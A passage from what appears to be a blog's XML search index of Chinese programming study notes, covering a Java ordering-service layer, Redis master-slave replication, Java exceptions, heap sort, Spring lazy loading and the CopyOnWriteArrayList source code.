对于订单详情、取消订单、完结订单service：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//订单详情@Overridepublic OrderDTO findOne(String orderId) &#123; OrderDTO orderDTO = new OrderDTO(); OrderMaster orderMaster = orderMasterRepository.findOne(orderId); if(orderMaster == null)&#123; throw new SellException(ResultEnum.ORDER_NOT_EXIST); &#125; List&lt;OrderDetail&gt; orderDetailList = orderDetailRepository.findByOrderId(orderId); if(CollectionUtils.isEmpty(orderDetailList))&#123; throw new SellException(ResultEnum.ORDERDETAIL_NOT_EXIST); &#125; BeanUtils.copyProperties(orderMaster,orderDTO); orderDTO.setOrderDetailList(orderDetailList); return orderDTO;&#125;//取消订单@Override@Transactionalpublic OrderDTO cancel(OrderDTO orderDTO) &#123; if(orderDTO==null || !orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【取消订单】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDTO.getOrderId(), orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; OrderMaster orderMaster = new OrderMaster(); orderDTO.setOrderStatus(OrderStatusEnum.CANCEL.getCode()); BeanUtils.copyProperties(orderDTO,orderMaster); OrderMaster updateOrderMaster = orderMasterRepository.save(orderMaster); if(updateOrderMaster == null)&#123; log.error("【取消订单】更新失败, orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; List&lt;CartDTO&gt; cartDTOList = orderDTO.getOrderDetailList().stream().map(e -&gt; new CartDTO(e.getProductId(),e.getProductQuantity())).collect(Collectors.toList()); productService.increaseStock(cartDTOList); return orderDTO;&#125;//完结订单@Override@Transactionalpublic OrderDTO finish(OrderDTO orderDTO) &#123; if(orderDTO==null || !orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【完结订单】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDTO.getOrderId(), orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; OrderMaster orderMaster = new OrderMaster(); orderDTO.setOrderStatus(OrderStatusEnum.FINISHED.getCode()); BeanUtils.copyProperties(orderDTO,orderMaster); OrderMaster updateOrderMaster = orderMasterRepository.save(orderMaster); if(updateOrderMaster == null)&#123; log.error("【完结订单】更新失败, orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDTO;&#125;//支付订单@Override@Transactionalpublic OrderDTO paid(OrderDTO orderDTO) &#123; if(orderDTO==null || !orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【支付订单】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDTO.getOrderId(), orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; OrderMaster orderMaster = new OrderMaster(); orderDTO.setPayStatus(PayStatusEnum.SUCCESS.getCode()); BeanUtils.copyProperties(orderDTO,orderMaster); OrderMaster updateOrderMaster = orderMasterRepository.save(orderMaster); if(updateOrderMaster == null)&#123; log.error("【支付订单】更新失败, orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDTO;&#125;]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.redis主从复制]]></title>
    <url>%2F2018%2F07%2F21%2F5.redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[介绍redis主从复制功能实现原理。 1.单机有什么问题 机器故障 容量瓶颈 QPS瓶颈 2. 主从复制的作用 数据副本 扩展读性能 一个master可以有多个slave，一个salve只能有一个master 3. 两种实现方式 方式一：slaveof命令 slaveof masterIp masterPort slaveof no one(不会清除原来同步的数据，而是新的数据不会再同步给他) 方式二：配置 修改某一行的配置：slaveof ip port 从节点只做读操作：slave-read-only yes 对比 命令的优点：不需要重启 命令的缺点：不便于管理 配置的优点：统一配置 配置的缺点：需要重启 一个场景，假如6380是6379的一个从节点，然后将6380执行salveof no one，然后插入一些新的数据；再重新变成6379的从节点，那么里面的新数据会被清除掉。 查看run_id redis-cli -p 6379 info server | grep run 4. 全量复制 全量复制开销 bgsave时间 rdb网络传输时间 从节点清空数据的时间 从节点加载RDB的时间 可能的AOF重写时间 存在的问题 时间开销比较大 如果master和slave之间网络扰动甚至断开，那么master此间更新的数据对于slave是不知道的，最简单的方法就是再进行一次全量复制，但是显然，消耗太大了。 5. 部分复制 6. 开发与运维的问题 读写分离 master只做写操作，slave来做读操作，来分摊流量。但是会有一些问题： 复制数据延迟 读到过期数据 从节点故障 主从配置不一致 例如maxmemory不一致：丢失数据 数据结构优化参数：内存不一致 规避全量复制 第一次全量复制：不可避免—小主节点(maxmemroy不要太大)或者在低峰时进行操作 节点run_id不匹配（主节点重启，那么master的run_id会发生变化，slave发现其run_id变化，会进行全量复制）；我们可以用故障转移，例如哨兵或集群来避免全量复制 复制积压缓冲区不足(网络中断，部分复制无法满足)，可以增大复制缓冲区配置size，网络增强 规避复制风暴 概念：主节点宕机造成大量的全量复制 单主节点复制风暴：主节点重启，多从节点复制；解决：更换复制拓扑 单机器复制风暴：机器宕机后（该机器全是Mater），大量全量复制。解决：master分散多机器。 说到底，还是需要有一种高可用的实现方式，在master出现故障之后，如何自动实现从slave晋升为master继续使用.下一章继续来分析。]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.java异常]]></title>
    <url>%2F2018%2F07%2F21%2F5.java%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[在开发中，异常处理是一个不可绕开的话题，我们对于异常的处理已经非常熟练了，对于异常本身的概念、用法等不再赘述了，直接结合面试问题来加深对异常的理解吧。 Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。 1. 什么是Java异常异常是发生在程序执行过程中阻碍程序正常执行的错误事件。比如：用户输入错误数据、硬件故障、网络阻塞等都会导致出现异常。 只要在Java语句执行中产生了异常，一个异常对象就会被创建，JRE就会试图寻找异常处理程序来处理异常。如果有合适的异常处理程序，异常对象就会被异常处理程序接管，否则，将引发运行环境异常，JRE终止程序执行。 Java异常处理框架只能处理运行时错误，编译错误不在其考虑范围之内。 2. Error和Exception的区别 Error通常是灾难性的致命的错误，是程序无法控制和处理的，当出现这些异常时，Java虚拟机（JVM）一般会选择终止线程；Exception通常情况下是可以被程序处理的，并且在程序中应该尽可能的去处理这些异常。 Error（错误）:是程序无法处理的错误，表示运行应用程序中较严重问题。大多数错误与代码编写者执行的操作无关，而表示代码运行时 JVM（Java 虚拟机）出现的问题。例如，Java虚拟机运行错误（Virtual MachineError），当 JVM 不再有继续执行操作所需的内存资源时，将出现OutOfMemoryError。这些异常发生时，Java虚拟机（JVM）一般会选择线程终止。 3. Java异常处理中有哪些关键字？ throw:有时我们需要显式地创建并抛出异常对象来终止程序的正常执行。throw关键字用来抛出并处理运行时异常。 throws:当我们抛出任何“被检查的异常(checked exception)”并不处理时，需要在方法签名中使用关键字throws来告知调用程序此方法可能会抛出的异常。调用方法可能会处理这些异常，或者同样用throws来将异常传给上一级调用方法。throws关键字后可接多个潜在异常，甚至是在main()中也可以使用throws。 try-catch:我们在代码中用try-catch块处理异常。当然，一个try块之后可以有多个catch子句，try-catch块也能嵌套。每个catch块必须接受一个（且仅有一个）代表异常类型的参数。 finally:finally块是可选的，并且只能配合try-catch一起使用。虽然异常终止了程序的执行，但是还有一些打开的资源没有被关闭，因此，我们能使用finally进行关闭。不管异常有没有出现，finally块总会被执行。 4. 描述一下异常的层级 Throwable是所有异常的父类，它有两个直接子对象Error,Exception，其中Exception又被继续划分为“被检查的异常(checked exception)”和”运行时的异常（runtime exception,即不受检查的异常）”。 Error表示编译时和系统错误，通常不能预期和恢复，比如硬件故障、JVM崩溃、内存不足等。 被检查的异常（Checked exception）在程序中能预期，并要尝试修复，如FileNotFoundException。我们必须捕获此类异常，并为用户提供有用信息和合适日志来进行调试。Exception是所有被检查的异常的父类。 运行时异常（Runtime Exception）又称为不受检查异常，源于糟糕的编程。比如我们检索数组元素之前必须确认数组的长度，否则就可能会抛出ArrayIndexOutOfBoundException运行时异常。RuntimeException是所有运行时异常的父类。 5. 描述Java 7 ARM(Automatic Resource Management，自动资源管理)特征和多个catch块的使用如果一个try块中有多个异常要被捕获，catch块中的代码会变丑陋的同时还要用多余的代码来记录异常。有鉴于此，Java 7的一个新特征是：一个catch子句中可以捕获多个异常。示例代码如下： 1234catch(IOException | SQLException | Exception ex)&#123; logger.error(ex); throw new MyException(ex.getMessage());&#125; 大多数情况下，当忘记关闭资源或因资源耗尽出现运行时异常时，我们只是用finally子句来关闭资源。这些异常很难调试，我们需要深入到资源使用的每一步来确定是否已关闭。因此，Java 7用try-with-resources进行了改进：在try子句中能创建一个资源对象，当程序的执行完try-catch之后，运行环境自动关闭资源。 利用Try-Catch-Finally管理资源（旧的代码风格）：1234567891011121314151617private static void printFile() throws IOException &#123; InputStream input = null; try &#123; input = new FileInputStream("file.txt");//可能发生异常1 int data = input.read();//可能发生异常2 while(data != -1)&#123; System.out.print((char) data); data = input.read(); &#125; &#125; finally &#123; if(input != null)&#123; input.close();//可能发生异常3 &#125; &#125;&#125; 假设try语句块抛出一个异常，然后finally语句块被执行。同样假设finally语句块也抛出了一个异常。那么哪个异常会根据调用栈往外传播？ 即使try语句块中抛出的异常与异常传播更相关，最终还是finally语句块中抛出的异常会根据调用栈向外传播。 在java7中，对于上面的例子可以用try-with-resource 结构这样写： 1234567891011private static void printFileJava7() throws IOException &#123; try(FileInputStream input = new FileInputStream("file.txt")) &#123; int data = input.read(); while(data != -1)&#123; System.out.print((char) data); data = input.read(); &#125; &#125;&#125; 当try语句块运行结束时，FileInputStream 会被自动关闭。这是因为FileInputStream 实现了java中的java.lang.AutoCloseable接口。所有实现了这个接口的类都可以在try-with-resources结构中使用。 当try-with-resources结构中抛出一个异常，同时FileInputStream被关闭时（调用了其close方法）也抛出一个异常，try-with-resources结构中抛出的异常会向外传播，而FileInputStream被关闭时抛出的异常被抑制了。 你可以在块中使用多个资源而且这些资源都能被自动地关闭。下面是例子： 12345678910111213private static void printFileJava7() throws IOException &#123; try( FileInputStream input = new FileInputStream("file.txt"); BufferedInputStream bufferedInput = new BufferedInputStream(input) ) &#123; int data = bufferedInput.read(); while(data != -1)&#123; System.out.print((char) data); data = bufferedInput.read(); &#125; &#125;&#125; 这些资源将按照他们被创建顺序的逆序来关闭。首先BufferedInputStream 会被关闭，然后FileInputStream会被关闭。 这个try-with-resources结构里不仅能够操作java内置的类。你也可以在自己的类中实现java.lang.AutoCloseable接口，然后在try-with-resources结构里使用这个类。 AutoClosable 接口仅仅有一个方法，接口定义如下： 1234public interface AutoClosable &#123; public void close() throws Exception;&#125; 任何实现了这个接口的方法都可以在try-with-resources结构中使用。下面是一个简单的例子： 1234567891011public class MyAutoClosable implements AutoCloseable &#123; public void doIt() &#123; System.out.println("MyAutoClosable doing it!"); &#125; @Override public void close() throws Exception &#123; System.out.println("MyAutoClosable closed!"); &#125;&#125; doIt()是方法不是AutoClosable 接口中的一部分，之所以实现这个方法是因为我们想要这个类除了关闭方法外还能做点其他事。 下面是MyAutoClosable 在try-with-resources结构中使用的例子： 123456private static void myAutoClosable() throws Exception &#123; try(MyAutoClosable myAutoClosable = new MyAutoClosable())&#123; myAutoClosable.doIt(); &#125;&#125; 运行结果： 12MyAutoClosable doing it!MyAutoClosable closed! 通过上面这些你可以看到，不论try-catch中使用的资源是自己创造的还是java内置的类型，try-with-resources都是一个能够确保资源能被正确地关闭的强大方法。 6. 在Java中throw与throws关键字之间的区别？throws用于在方法签名中声明此方法可能抛出的异常，而throw关键字则是中断程序的执行并移交异常对象到运行时进行处理。 7. 在Java中怎么写自定义的异常？我们能继承Exception类或其任何子类来实现自己的自定义异常类。这自定义异常类可以有自己变量和方法来传递错误代码或其它异常相关信息来处理异常。 1234567891011121314@Datapublic class HappyBikeException extends RuntimeException&#123; private Integer code = ResponseEnum.ERROR.getCode(); public HappyBikeException(Integer code,String msg)&#123; super(msg); this.code = code; &#125; public HappyBikeException(String msg)&#123; super(msg); &#125;&#125; 8. Java中final,finally,finalize的区别？final和finally在Java中是关键字，而finalize则是一个方法。 final关键字使得类变量不可变，避免类被其它类继承或方法被重写。finally跟try-catch块一起使用，即使是出现了异常，其子句总会被执行，通常，finally子句用来关闭相关资源。finally方法中的对象被销毁之前会被垃圾回收。 9. 在main方法抛出异常时发生了什么？答：当main方法抛出异常时，Java运行时间终止并在控制台打印异常信息和栈轨迹。 10. catch子句能为空吗？catch后面括号里面不能为空。 答：可以有空的catch子句，但那是最糟糕的编程，因为那样的话，异常即使被捕获，我们也得不到任何的有用信息，对于调试来说会是个噩梦，因此，编程时永远不要有空的catch子句。Catch子句中至少要包含一个日志语句输出到控制台或保存到日志文件中。 11. 提供一些Java异常处理的最佳实践。 使用具体的异常方便调试 程序中早点抛出异常 捕获异常后先让调用者处理异常 使用Java 7 ARM功能确保资源关闭或者用finally子句正确地关闭它们 为了调试需要总是记录异常信息 用多个catch子句实现更完全的关闭 你自己的应用API中用自定义的异常来抛出单种类型异常 遵循命名规定，以异常结束 在Javadoc中用@throws来标注方法抛出的异常 处理异常是有花销的，因此只有在必要时才抛出。否则，你会扑空或毫无收获。 12. try、catch、finally三个语句块应注意的问题 try、catch、finally三个语句块均不能单独使用，三者可以组成 try…catch…finally、try…catch、try…finally三种结构，catch语句可以有一个或多个，finally语句最多一个。 try、catch、finally三个代码块中变量的作用域为代码块内部，分别独立而不能相互访问。如果要在三个块中都可以访问，则需要将变量定义到这些块的外面。 多个catch块时候，只会匹配其中一个异常类并执行catch块代码，而不会再执行别的catch块，并且匹配catch语句的顺序是由上到下。 无论程序是否有异常，并且无论之间try-catch是否顺利执行完毕，都会执行finally语句。在以下特殊情况下，finally块不会执行：在finally语句块中发生异常；在前面代码中使用了System.exit()退出程序；程序所在线程死亡；关闭cpu。 当程序执行try块，catch块时遇到return语句或者throw语句，这两个语句都会导致该方法立即结束，所以系统并不会立即执行这两个语句，而是去寻找该异常处理流程中的finally块，如果没有finally块，程序立即执行return语句或者throw语句，方法终止。如果有finally块，系统立即开始执行finally块，只有当finally块执行完成后，系统才会再次跳回来执行try块、catch块里的return或throw语句，如果finally块里也使用了return或throw等导致方法终止的语句，则finally块已经终止了方法，不用再跳回去执行try块、catch块里的任何代码了。 13. 解释Java中的异常处理流程 异常处理完成以后，Exception对象会发生什么变化？Exception对象会在下一个垃圾回收过程中被回收掉。 请写出 5 种常见到的runtime exception。NullPointerException：当操作一个空引用时会出现此错误。 NumberFormatException：数据格式转换出现问题时出现此异常。 ClassCastException：强制类型转换类型不匹配时出现此异常。 ArrayIndexOutOfBoundsException：数组下标越界，当使用一个不存在的数组下标时出现此异常。 ArithmeticException：数学运行错误时出现此异常 参考： http://www.importnew.com/7383.html http://www.importnew.com/7541.html http://www.importnew.com/7820.html]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4、堆排序和优先队列]]></title>
    <url>%2F2018%2F07%2F21%2F4%E3%80%81%E5%A0%86%E6%8E%92%E5%BA%8F%E5%92%8C%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[堆排序和优先队列 1. 什么是优先队列普通队列：先进先出，后进后出 优先队列：出队顺序和入队顺序无关，和优先级相关 2. 为什么要使用优先队列从N个元素中选出前M个元素，用排序的手段时间复杂度为NlgN，但是用优先队列，可以达到NlgM. 3. 堆的定义 堆是一棵顺序存储的完全二叉树。完全二叉树中所有非终端节点的值均不大于（或不小于）其左、右孩子节点的值。 数据结构二叉堆能够很好地实现优先队列的操作 在“堆排序”中的“堆”通常指“二叉堆（binary heap)” 其中每个节点的值小于等于其左、右孩子的值，这样的堆称为小根堆； 其中每个节点的值大于等于其左、右孩子的值，这样的堆称为大根堆； 4. 二叉堆的结构首先明确完全二叉树的定义： 除二叉树最后一层外，其他各层的节点数都达到最大个数，且最后一层从左向右的叶节点连续存在，只缺右侧若干节点，就是完全二叉树。 如下图，每一层都是从左向右摆放节点，每个节点都是摆满两个子节点后才向右移动到下一个节点，一层摆满后向下移动一层，直到摆放完所有数字。这样得到的二叉树就是完全二叉树，中间有任何缺失的节点就不能称为完全二叉树。 二叉堆是一种完全二叉树，他们的区别是： 二叉堆是一颗完全二叉树，完全二叉树只用数组而不需要指针就可以表示。 4. 堆的算法我们用N+1长度的数组来表示一个大小为N的堆，我们不会使用[0],堆元素会被保存于[1]-[N-1]中。 4.1 最大堆的插入(上浮) 123456789/* * k:当前插入元素的位置，相应地k/2就是其父结点的位置 */private void swim(int k)&#123; while(k&gt;1 &amp;&amp; less(k/2,k))&#123; swap(k/2,k); k = k/2; &#125;&#125; 4.2 最大堆的删除 1234//伪代码1. 获取根结点2. 将根结点与最后一个结点交换3. 恢复堆的有序性... 显然现在看来该二叉树虽然是一个完全二叉树，但是它并不符合最大堆的相关定义，我们的目的是要在删除完成之后，该完全二叉树依然是最大堆。因此就需要我们来做一些相关的操作！ 1234567891011121314/* * k:当前被删除元素的位置(若删除根节点,则k=1)，相应地2*k就是其左子结点的位置 */private void sink(int k)&#123; while(2*k &lt; N)&#123; int j = 2 * k; if(j &lt; N &amp;&amp; less(j,j+1)) j++; if(!less(k,j)) break; swap(k,j); k = j; &#125;&#125; 5. 堆排序5.1 堆排序的介绍 堆排序是简单选择排序的一种改进，改进的着眼点是：如何减少关键码的比较次数。简单选择排序在一趟中仅选出最小关键码，没有把一趟比较结果保存下来，因而记录的比较次数较多。堆排序在选出最小关键码的同时，也找出较小关键码，减少了在后面的选择中的比较次数，从而提高了整个排序的效率 5.2 堆排序的实现思路假设有这么一个数组待排序 ① 初始化操作：将R[1..n]构造为初始堆； ② 每一趟排序的基本操作(原地堆排序)：将当前无序区的堆顶记录R[1]和该区间的最后一个记录交换，然后将新的无序区调整为堆(亦称重建堆)。这样，最大的数就被放到了最后面，循环完毕时，数组元素从小到大依次排序好。过程思想可参考《算法》第四版的207页。 5.3 原地堆排序的代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class HeapSort &#123; public static void main(String[] args) &#123; //数组中a[0]，不参与排序，只对a[1]-a[len-1]排序 int a[] = &#123;0 , 1, 3, 2, 16, 9, 10, 14, 8, 7&#125;; System.out.println("输入的数组为："+Arrays.toString(a)); int len=a.length-1; heapSort(a,len); System.out.println("排序后的堆为："+Arrays.toString(a)); &#125; public static void swap(int[] data, int i, int j) &#123; if (i == j) &#123; return; &#125; data[i] = data[i] + data[j]; data[j] = data[i] - data[j]; data[i] = data[i] - data[j]; &#125; /** * 排序，先构造出堆，再将数组排序 * @param r 当前代排序的数组 * @param n 数组元素个数 */ public static void heapSort(int r[],int n)&#123; //从第一个非叶子结点开始构建子堆 for(int i=n/2;i&gt;=1;i--)&#123; Sift(r,i,n); &#125; System.out.println("构造出来的堆："+Arrays.toString(r));//构建出的大根堆 for(int i=1;i&lt;n;i++)&#123; //将根结点与最后一个节点进行交换 swap(r,1,n-i+1); //调整这个堆 Sift(r,1,n-i); &#125; &#125; /** * 筛选调整堆 * @param k 当前要筛选结点的编号为k， * @param m 堆中最后一个结点的编号为m */ public static void Sift(int r[],int k,int m)&#123; int i=k;//被筛选的结点 int j=2*i;//左子树 while(j&lt;=m)&#123; if(j&lt;m&amp;&amp;r[j]&lt;r[j+1])j++; //对比左右两个子节点哪个大 if(r[j]&lt;r[i])break; //父结点大于两个子节点就停止循环 else&#123; swap(r,i,j); i=j; //被筛选结点位于原来的结点j的位置 j=2*i; &#125; &#125; &#125; &#125; 代码运行结果： 123输入的数组为：[0, 1, 3, 2, 16, 9, 10, 14, 8, 7]构造出来的堆：[0, 16, 9, 14, 8, 1, 10, 2, 3, 7]排序后的堆为：[0, 1, 2, 3, 7, 8, 9, 10, 14, 16]]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.@lazy-bean-懒加载]]></title>
    <url>%2F2018%2F07%2F21%2F5.%40lazy-bean-%E6%87%92%E5%8A%A0%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 单实例bean，默认在容器启动时创建对象。 即只要执行了： ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); Person这个对象就会加载在容器中。测试一下： 12345678@Configurationpublic class MainConfig2 &#123; @Bean public Person person()&#123; System.out.println("创建对象Person");//容器启动的时候就会执行这个方法，创建Perosn对象 return new Person("李四",20); &#125;&#125; 懒加载：容器启动时不创建对象，第一次使用(获取)Bean创建对象。 123456789@Configurationpublic class MainConfig2 &#123; @Bean @Lazy public Person person()&#123; System.out.println("创建对象Person"); return new Person("李四",20); &#125;&#125; 这个时候，就不会在容器一启动的时候就加载了。那什么时候加载呢？ 我获取一下这个对象： 12ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class);Object bean = applicationContext.getBean("person"); 这个时候，@Bean就被创建了。这就是懒加载。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4、idea初始化]]></title>
    <url>%2F2018%2F07%2F21%2F4%E3%80%81idea%E5%88%9D%E5%A7%8B%E5%8C%96%2F</url>
    <content type="text"><![CDATA[idea初始化，就是搭建起来一个最基本的maven项目。 idea初始化————–&gt;idea初始化]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4、CopyOnWriteArrayList源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F4%E3%80%81CopyOnWriteArrayList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析CopyOnWriteArrayList源码。 关注点 结论 CopyOnWriteArrayList是否允许空 允许 CopyOnWriteArrayList是否允许重复数据 允许 CopyOnWriteArrayList是否有序 有序 CopyOnWriteArrayList是否线程安全 线程安全 一、概述 CopyOnWriteArrayList是ArrayList 的一个线程安全的变体，其中所有可变操作（add、set 等等）都是通过对底层数组进行一次新的复制来实现的。 我们知道了 CopyOnWriteArrayList 是一个写时复制的容器，采用了读写分离的思想。通俗点来讲，在对容器进行写操作时，不直接修改当前容器，而是先对当前容器进行拷贝得到一个副本，然后对副本进行写操作，最后再将原容器的引用指向拷贝出来的副本。这样做的好处就是可以对容器进行并发读而不用进行加锁。 二、CopyOnWriteArrayList源码分析1. 类的继承关系12public class CopyOnWriteArrayList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable 说明：CopyOnWriteArrayList实现了List接口，List接口定义了对列表的基本操作；同时实现了RandomAccess接口，表示可以随机访问（数组具有随机访问的特性）；同时实现了Cloneable接口，表示可克隆；同时也实现了Serializable接口，表示可被序列化. 2. 类的属性12345678910111213141516171819202122/** 用于在对数组产生写操作的方法加锁. */final transient ReentrantLock lock = new ReentrantLock();/** 底层的存储结构. */private transient volatile Object[] array;/** 反射机制. */private static final sun.misc.Unsafe UNSAFE;/** lock域的内存偏移量. */private static final long lockOffset;static &#123; try &#123; UNSAFE = sun.misc.Unsafe.getUnsafe(); Class&lt;?&gt; k = CopyOnWriteArrayList.class; lockOffset = UNSAFE.objectFieldOffset (k.getDeclaredField("lock")); &#125; catch (Exception e) &#123; throw new Error(e); &#125;&#125; 3. 构造函数123456/** * Creates an empty list. */public CopyOnWriteArrayList() &#123; setArray(new Object[0]);&#125; 说明：该构造函数用于创建一个空列表。 123456789101112131415161718192021222324252627282930313233public CopyOnWriteArrayList(Collection&lt;? extends E&gt; c) &#123; Object[] elements; if (c.getClass() == CopyOnWriteArrayList.class) elements = ((CopyOnWriteArrayList&lt;?&gt;)c).getArray(); else &#123; elements = c.toArray(); // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elements.getClass() != Object[].class) elements = Arrays.copyOf(elements, elements.length, Object[].class); &#125; setArray(elements);&#125;final Object[] getArray() &#123; return array;&#125;final void setArray(Object[] a) &#123; array = a;&#125;//说明：该函数用于复制指定的数组，截取或用 null 填充（如有必要），以使副本具有指定的长度。public static &lt;T,U&gt; T[] copyOf(U[] original, int newLength, Class&lt;? extends T[]&gt; newType) &#123; @SuppressWarnings("unchecked") // 确定copy的类型（将newType转化为Object类型，将Object[].class转化为Object类型，判断两者是否相等，若相等，则生成指定长度的Object数组 // 否则,生成指定长度的新类型的数组） T[] copy = ((Object)newType == (Object)Object[].class) ? (T[]) new Object[newLength] : (T[]) Array.newInstance(newType.getComponentType(), newLength); System.arraycopy(original, 0, copy, 0, Math.min(original.length, newLength)); return copy;&#125; 1234567说明：该构造函数用于创建一个按 collection 的迭代器返回元素的顺序包含指定 collection 元素的列表。该构造函数的处理流程如下 ① 判断传入的集合c的类型是否为CopyOnWriteArrayList类型，若是，则获取该集合类型的底层数组（Object[]），并且设置当前CopyOnWriteArrayList的数组（Object[]数组），进入步骤③；否则，进入步骤② ② 将传入的集合转化为数组elements，判断elements的类型是否为Object[]类型（toArray方法可能不会返回Object类型的数组），若不是，则将elements转化为Object类型的数组。进入步骤③ ③ 设置当前CopyOnWriteArrayList的Object[]为elements。 123public CopyOnWriteArrayList(E[] toCopyIn) &#123; setArray(Arrays.copyOf(toCopyIn, toCopyIn.length, Object[].class));&#125; 说明：该构造函数用于创建一个保存给定数组的副本的列表。 4. 核心方法4.1 数组末尾添加一个元素 12345678910111213141516171819202122public boolean add(E e) &#123; // 可重入锁 final ReentrantLock lock = this.lock; // 获取锁 lock.lock(); try &#123; // 元素数组 Object[] elements = getArray(); // 数组长度 int len = elements.length; // 复制数组 Object[] newElements = Arrays.copyOf(elements, len + 1); // 将要添加的元素放到副本数组的末尾去 newElements[len] = e; // 设置数组 setArray(newElements); return true; &#125; finally &#123; // 释放锁 lock.unlock(); &#125;&#125; 1234567说明：此函数用于将指定元素添加到此列表的尾部，处理流程如下 ① 获取锁（保证多线程的安全访问），获取当前的Object数组，获取Object数组的长度为length，进入步骤②。 ② 根据Object数组复制一个长度为length+1的Object数组为newElements（此时，newElements[length]为null），进入步骤③。 ③ 将下标为length的数组元素newElements[length]设置为元素e，再设置当前Object[]为newElements，释放锁，返回。这样就完成了元素的添加。 4.2 在指定位置添加元素12345678910111213141516171819202122232425public void add(int index, E element) &#123; final ReentrantLock lock = this.lock; lock.lock(); try &#123; Object[] elements = getArray(); int len = elements.length; if (index &gt; len || index &lt; 0) throw new IndexOutOfBoundsException("Index: "+index+ ", Size: "+len); Object[] newElements; int numMoved = len - index; if (numMoved == 0) newElements = Arrays.copyOf(elements, len + 1); else &#123; newElements = new Object[len + 1]; System.arraycopy(elements, 0, newElements, 0, index); System.arraycopy(elements, index, newElements, index + 1, numMoved); &#125; newElements[index] = element; setArray(newElements); &#125; finally &#123; lock.unlock(); &#125;&#125; 原理同末尾添加一个数据，只是copy的时候，分段copy而已。 4.3 如果没有这个元素则添加12345public boolean addIfAbsent(E e) &#123; Object[] snapshot = getArray(); return indexOf(e, snapshot, 0, snapshot.length) &gt;= 0 ? false : addIfAbsent(e, snapshot);&#125; 4.4 通过快照数组和当前数组进行对比来确定是否一致，确保添加元素的线程安全12345678910111213141516171819202122232425262728293031323334private boolean addIfAbsent(E e, Object[] snapshot) &#123; // 重入锁 final ReentrantLock lock = this.lock; // 获取锁 lock.lock(); try &#123; // 获取数组 Object[] current = getArray(); // 数组长度 int len = current.length; if (snapshot != current) &#123; // 快照不等于当前数组，对数组进行了修改 // 取较小者 int common = Math.min(snapshot.length, len); for (int i = 0; i &lt; common; i++) // 遍历 if (current[i] != snapshot[i] &amp;&amp; eq(e, current[i])) // 当前数组的元素与快照的元素不相等并且e与当前元素相等 // 表示在snapshot与current之间修改了数组，并且设置了数组某一元素为e，已经存在 // 返回false return false; if (indexOf(e, current, common, len) &gt;= 0) // 在当前数组中找到e元素 // 返回false return false; &#125; // 复制数组 Object[] newElements = Arrays.copyOf(current, len + 1); // 对数组len索引的元素赋值为e newElements[len] = e; // 设置数组 setArray(newElements); return true; &#125; finally &#123; // 释放锁 lock.unlock(); &#125;&#125; 1234567891011说明：该函数用于添加元素（如果数组中不存在，则添加；否则，不添加，直接返回）。可以保证多线程环境下不会重复添加元素，该函数的流程如下 ① 获取锁，获取当前数组为current，current长度为len，判断数组之前的快照snapshot是否等于当前数组current，若不相等，则进入步骤②；否则，进入步骤④ ② 不相等，表示在snapshot与current之间，对数组进行了修改（如进行了add、set、remove等操作），获取长度（snapshot与current之间的较小者），对current进行遍历操作，若遍历过程发现snapshot与current的元素不相等并且current的元素与指定元素相等（可能进行了set操作），进入步骤⑤，否则，进入步骤③ ③ 在当前数组中索引指定元素，若能够找到，进入步骤⑤，否则，进入步骤④ ④ 复制当前数组current为newElements，长度为len+1，此时newElements[len]为null。再设置newElements[len]为指定元素e，再设置数组，进入步骤⑤ ⑤ 释放锁，返回。 4.5 修改指定索引处的元素1234567891011121314151617181920212223242526272829303132public E set(int index, E element) &#123; // 可重入锁 final ReentrantLock lock = this.lock; // 获取锁 lock.lock(); try &#123; // 获取数组 Object[] elements = getArray(); // 获取index索引的元素 E oldValue = get(elements, index); if (oldValue != element) &#123; // 旧值不等于element // 数组长度 int len = elements.length; // 复制数组 Object[] newElements = Arrays.copyOf(elements, len); // 重新赋值index索引的值 newElements[index] = element; // 设置数组 setArray(newElements); &#125; else &#123; // Not quite a no-op; ensures volatile write 